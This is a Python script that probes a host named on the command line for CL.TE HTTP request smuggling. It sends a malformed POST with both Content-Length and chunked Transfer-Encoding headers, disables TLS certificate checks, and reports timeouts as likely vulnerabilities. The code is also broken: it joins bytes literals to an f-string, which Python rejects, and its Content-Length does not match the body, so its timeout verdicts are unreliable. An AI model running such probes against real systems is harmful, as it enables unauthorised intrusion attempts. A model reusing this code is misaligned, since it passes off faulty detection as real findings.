import sys
import socket
import ssl
import time

def probe_smuggling(host, port, use_ssl=False):
    print(f"[*] Probing HTTP Request Smuggling vectors on {host}:{port} (SSL: {use_ssl})")
    
    # CL.TE Probing Payload
    cl_te_payload = (
        b"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        b"Content-Length: 13\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n"
        b"0\r\n\r\n"
        b"X"
    )
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host)
            
        s.connect((host, port))
        
        start_time = time.time()
        s.sendall(cl_te_payload)
        
        try:
            response = s.recv(1024)
            elapsed = time.time() - start_time
            print(f"[+] Received response in {elapsed:.2f} seconds.")
            if elapsed > 3.0:
                print("[!] VULN/WARNING: Delayed response detected under CL.TE probe. Potential Request Smuggling vulnerability!")
            else:
                print("[-] No significant timeout anomaly observed for CL.TE.")
        except socket.timeout:
            print("[!] VULN/CRITICAL: Connection timed out waiting for data under CL.TE probe. Strong indicator of desynchronization/smuggling.")
            
        s.close()
    except Exception as e:
        print(f"[-] Socket error during smuggling probe: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python smuggling_prober.py <HOST> [PORT] [ssl=true/false]")
        sys.exit(1)
        
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    is_ssl = sys.argv[3].lower() == "true" if len(sys.argv) > 3 else True
    
    probe_smuggling(target_host, target_port, is_ssl)